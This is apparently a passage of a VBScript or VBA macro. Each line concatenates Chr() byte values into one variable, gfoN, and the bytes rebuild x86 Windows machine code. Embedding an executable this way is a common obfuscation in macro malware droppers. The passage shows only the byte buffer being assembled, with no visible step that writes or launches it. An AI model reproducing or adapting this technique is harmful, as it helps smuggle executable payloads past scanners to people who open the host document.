gfoN=gfoN&Chr(195)&Chr(235)&Chr(37)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(32)&Chr(129)&Chr(251)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(83)&Chr(232)&Chr(57)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(234)&Chr(238)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(4)&Chr(131)&Chr(101)&Chr(224)&Chr(0)&Chr(139)&Chr(69)&Chr(224)&Chr(232)&Chr(249)&Chr(232)&Chr(255)&Chr(255)&Chr(195)&Chr(131)&Chr(61)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(18)&Chr(106)&Chr(253)&Chr(232)&Chr(86)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(199)&Chr(5)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(136)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(137)&Chr(232)&Chr(255)&Chr(255)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(116)&Chr(117)&Chr(131)&Chr(61)
gfoN=gfoN&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(117)&Chr(67)&Chr(106)&Chr(4)&Chr(232)&Chr(194)&Chr(236)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(86)&Chr(232)&Chr(201)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(133)&Chr(192)&Chr(116)&Chr(9)&Chr(86)&Chr(80)&Chr(232)&Chr(234)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(228)&Chr(0)&Chr(117)&Chr(55)&Chr(255)&Chr(117)&Chr(8)&Chr(235)&Chr(10)&Chr(106)&Chr(4)&Chr(232)&Chr(174)&Chr(235)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(86)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(116)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(22)&Chr(232)&Chr(64)&Chr(238)&Chr(255)&Chr(255)&Chr(139)&Chr(240)
gfoN=gfoN&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(232)&Chr(240)&Chr(237)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(89)&Chr(232)&Chr(77)&Chr(232)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(41)&Chr(28)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(133)&Chr(255)&Chr(117)&Chr(39)&Chr(57)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(31)&Chr(86)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(134)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(59)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(202)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(106)
gfoN=gfoN&Chr(0)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(169)&Chr(28)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(255)&Chr(117)&Chr(39)&Chr(57)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(31)&Chr(86)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(134)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(59)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(195)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(125)&Chr(29)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(89)&Chr(133)&Chr(255)&Chr(117)&Chr(44)&Chr(57)&Chr(69)&Chr(12)&Chr(116)&Chr(39)&Chr(57)
gfoN=gfoN&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(31)&Chr(86)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(134)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(59)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(193)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(86)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(193)&Chr(139)&Chr(209)&Chr(3)&Chr(198)&Chr(59)&Chr(254)&Chr(118)&Chr(8)&Chr(59)&Chr(248)&Chr(15)&Chr(130)&Chr(164)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(249)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(114)&Chr(31)&Chr(131)&Chr(61)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(22)&Chr(87)&Chr(86)&Chr(131)&Chr(231)&Chr(15)&Chr(131)&Chr(230)
gfoN=gfoN&Chr(15)&Chr(59)&Chr(254)&Chr(94)&Chr(95)&Chr(117)&Chr(8)&Chr(94)&Chr(95)&Chr(93)&Chr(233)&Chr(158)&Chr(31)&Chr(0)&Chr(0)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(21)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(42)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(144)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(233)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(3)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(24)&Chr(63)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(20)&Chr(64)&Chr(64)&Chr(0)&Chr(144)&Chr(255)&Chr(36)&Chr(141)&Chr(152)&Chr(63)&Chr(64)&Chr(0)&Chr(144)&Chr(40)&Chr(63)&Chr(64)&Chr(0)&Chr(84)&Chr(63)&Chr(64)&Chr(0)&Chr(120)&Chr(63)&Chr(64)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)
gfoN=gfoN&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(198)&Chr(3)&Chr(131)&Chr(199)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(204)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(198)&Chr(2)&Chr(131)&Chr(199)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(166)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(144)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(131)&Chr(198)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(243)&Chr(165)&Chr(255)&Chr(36)
gfoN=gfoN&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(251)&Chr(63)&Chr(64)&Chr(0)&Chr(232)&Chr(63)&Chr(64)&Chr(0)&Chr(224)&Chr(63)&Chr(64)&Chr(0)&Chr(216)&Chr(63)&Chr(64)&Chr(0)&Chr(208)&Chr(63)&Chr(64)&Chr(0)&Chr(200)&Chr(63)&Chr(64)&Chr(0)&Chr(192)&Chr(63)&Chr(64)&Chr(0)&Chr(184)&Chr(63)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(228)&Chr(137)&Chr(68)&Chr(143)&Chr(228)&Chr(139)&Chr(68)&Chr(142)&Chr(232)&Chr(137)&Chr(68)&Chr(143)&Chr(232)&Chr(139)&Chr(68)&Chr(142)&Chr(236)&Chr(137)&Chr(68)&Chr(143)&Chr(236)&Chr(139)&Chr(68)&Chr(142)&Chr(240)&Chr(137)&Chr(68)&Chr(143)&Chr(240)&Chr(139)&Chr(68)&Chr(142)&Chr(244)&Chr(137)&Chr(68)&Chr(143)&Chr(244)&Chr(139)&Chr(68)&Chr(142)&Chr(248)&Chr(137)&Chr(68)&Chr(143)&Chr(248)&Chr(139)&Chr(68)&Chr(142)&Chr(252)&Chr(137)&Chr(68)&Chr(143)&Chr(252)&Chr(141)&Chr(4)&Chr(141)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(20)&Chr(64)&Chr(64)&Chr(0)&Chr(28)&Chr(64)&Chr(64)&Chr(0)&Chr(40)&Chr(64)&Chr(64)&Chr(202)&Chr(60)&Chr(64)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(141)&Chr(116)&Chr(49)&Chr(252)
gfoN=gfoN&Chr(141)&Chr(124)&Chr(57)&Chr(252)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(36)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(13)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(247)&Chr(217)&Chr(255)&Chr(36)&Chr(141)&Chr(80)&Chr(65)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(249)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(43)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(164)&Chr(64)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(144)&Chr(180)&Chr(64)&Chr(64)&Chr(0)&Chr(216)&Chr(64)&Chr(64)&Chr(0)&Chr(0)&Chr(65)&Chr(64)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)
gfoN=gfoN&Chr(131)&Chr(238)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(239)&Chr(1)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(178)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(238)&Chr(2)&Chr(131)&Chr(239)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(238)&Chr(3)&Chr(131)&Chr(239)&Chr(3)&Chr(131)&Chr(249)&Chr(8)
gfoN=gfoN&Chr(15)&Chr(130)&Chr(86)&Chr(255)&Chr(255)&Chr(255)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(84)&Chr(65)&Chr(64)&Chr(0)&Chr(92)&Chr(65)&Chr(64)&Chr(0)&Chr(100)&Chr(65)&Chr(64)&Chr(0)&Chr(108)&Chr(65)&Chr(64)&Chr(0)&Chr(116)&Chr(65)&Chr(64)&Chr(0)&Chr(124)&Chr(65)&Chr(64)&Chr(0)&Chr(132)&Chr(65)&Chr(64)&Chr(0)&Chr(151)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(28)&Chr(137)&Chr(68)&Chr(143)&Chr(28)&Chr(139)&Chr(68)&Chr(142)&Chr(24)&Chr(137)&Chr(68)&Chr(143)&Chr(24)&Chr(139)&Chr(68)&Chr(142)&Chr(20)&Chr(137)&Chr(68)&Chr(143)&Chr(20)&Chr(139)&Chr(68)&Chr(142)&Chr(16)&Chr(137)&Chr(68)&Chr(143)&Chr(16)&Chr(139)&Chr(68)&Chr(142)&Chr(12)&Chr(137)&Chr(68)&Chr(143)&Chr(12)&Chr(139)&Chr(68)&Chr(142)&Chr(8)&Chr(137)&Chr(68)&Chr(143)&Chr(8)
gfoN=gfoN&Chr(139)&Chr(68)&Chr(142)&Chr(4)&Chr(137)&Chr(68)&Chr(143)&Chr(4)&Chr(141)&Chr(4)&Chr(141)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(176)&Chr(65)&Chr(64)&Chr(0)&Chr(184)&Chr(65)&Chr(64)&Chr(0)&Chr(200)&Chr(65)&Chr(64)&Chr(0)&Chr(220)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)
gfoN=gfoN&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(139)&Chr(134)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(219)&Chr(87)&Chr(59)&Chr(195)&Chr(116)&Chr(111)&Chr(61)&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(104)&Chr(139)&Chr(134)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(94)&Chr(57)&Chr(24)&Chr(117)&Chr(90)&Chr(139)&Chr(134)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(23)&Chr(57)&Chr(24)&Chr(117)&Chr(19)&Chr(80)&Chr(232)&Chr(238)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(177)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(139)&Chr(134)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(23)
gfoN=gfoN&Chr(57)&Chr(24)&Chr(117)&Chr(19)&Chr(80)&Chr(232)&Chr(205)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(75)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(255)&Chr(182)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(181)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(170)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(139)&Chr(134)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(68)&Chr(57)&Chr(24)&Chr(117)&Chr(64)&Chr(139)&Chr(134)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(45)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(137)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(134)&Chr(204)&Chr(0)&Chr(0)&Chr(0)&Chr(191)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(43)&Chr(199)&Chr(80)&Chr(232)&Chr(118)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(134)&Chr(208)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(43)&Chr(199)&Chr(80)&Chr(232)&Chr(104)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(93)&Chr(250)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(16)&Chr(141)&Chr(190)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(7)&Chr(61)&Chr(32)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(23)&Chr(57)&Chr(152)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(15)&Chr(80)&Chr(232)&Chr(49)&Chr(29)&Chr(0)&Chr(0)&Chr(255)&Chr(55)&Chr(232)&Chr(54)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(141)&Chr(126)&Chr(80)&Chr(199)&Chr(69)&Chr(8)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(127)&Chr(248)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(17)&Chr(139)&Chr(7)&Chr(59)&Chr(195)&Chr(116)&Chr(11)&Chr(57)&Chr(24)&Chr(117)&Chr(7)&Chr(80)&Chr(232)&Chr(17)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(57)
gfoN=gfoN&Chr(95)&Chr(252)&Chr(116)&Chr(18)&Chr(139)&Chr(71)&Chr(4)&Chr(59)&Chr(195)&Chr(116)&Chr(11)&Chr(57)&Chr(24)&Chr(117)&Chr(7)&Chr(80)&Chr(232)&Chr(250)&Chr(249)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(199)&Chr(16)&Chr(255)&Chr(77)&Chr(8)&Chr(117)&Chr(199)&Chr(86)&Chr(232)&Chr(235)&Chr(249)&Chr(255)&Chr(255)&Chr(89)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(139)&Chr(53)&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(125)&Chr(8)&Chr(87)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)
gfoN=gfoN&Chr(214)&Chr(139)&Chr(135)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(141)&Chr(95)&Chr(80)&Chr(199)&Chr(69)&Chr(8)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(123)&Chr(248)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(9)&Chr(139)&Chr(3)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(123)&Chr(252)&Chr(0)&Chr(116)&Chr(10)&Chr(139)&Chr(67)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(195)&Chr(16)&Chr(255)&Chr(77)&Chr(8)&Chr(117)&Chr(214)&Chr(139)&Chr(135)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(214)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(139)&Chr(125)&Chr(8)&Chr(133)&Chr(255)&Chr(15)&Chr(132)&Chr(131)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(83)&Chr(86)&Chr(139)&Chr(53)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(141)&Chr(95)&Chr(80)&Chr(199)&Chr(69)&Chr(8)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(123)&Chr(248)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(9)&Chr(139)&Chr(3)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(123)&Chr(252)&Chr(0)&Chr(116)&Chr(10)&Chr(139)
gfoN=gfoN&Chr(67)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(147)&Chr(195)&Chr(16)&Chr(255)&Chr(77)&Chr(8)&Chr(117)&Chr(214)&Chr(139)&Chr(135)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(214)&Chr(94)&Chr(91)&Chr(139)&Chr(199)&Chr(95)&Chr(93)&Chr(195)&Chr(133)&Chr(255)&Chr(116)&Chr(55)&Chr(133)&Chr(192)&Chr(116)&Chr(51)&Chr(86)&Chr(139)&Chr(48)&Chr(59)&Chr(247)&Chr(116)&Chr(40)&Chr(87)&Chr(137)&Chr(56)&Chr(232)&Chr(193)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(246)&Chr(116)&Chr(27)&Chr(86)&Chr(232)&Chr(69)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(62)&Chr(0)&Chr(89)&Chr(117)&Chr(15)&Chr(129)&Chr(254)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(89)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(199)&Chr(94)&Chr(195)&Chr(51)&Chr(192)&Chr(195)
gfoN=gfoN&Chr(106)&Chr(12)&Chr(104)&Chr(168)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(8)&Chr(225)&Chr(255)&Chr(255)&Chr(232)&Chr(252)&Chr(221)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(161)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(70)&Chr(112)&Chr(116)&Chr(34)&Chr(131)&Chr(126)&Chr(108)&Chr(0)&Chr(116)&Chr(28)&Chr(232)&Chr(229)&Chr(221)&Chr(255)&Chr(255)&Chr(139)&Chr(112)&Chr(108)&Chr(133)&Chr(246)&Chr(117)&Chr(8)&Chr(106)&Chr(32)&Chr(232)&Chr(90)&Chr(205)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(232)&Chr(27)&Chr(225)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(12)&Chr(232)&Chr(30)&Chr(229)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(141)&Chr(70)&Chr(108)&Chr(139)&Chr(61)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(232)&Chr(105)&Chr(255)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)
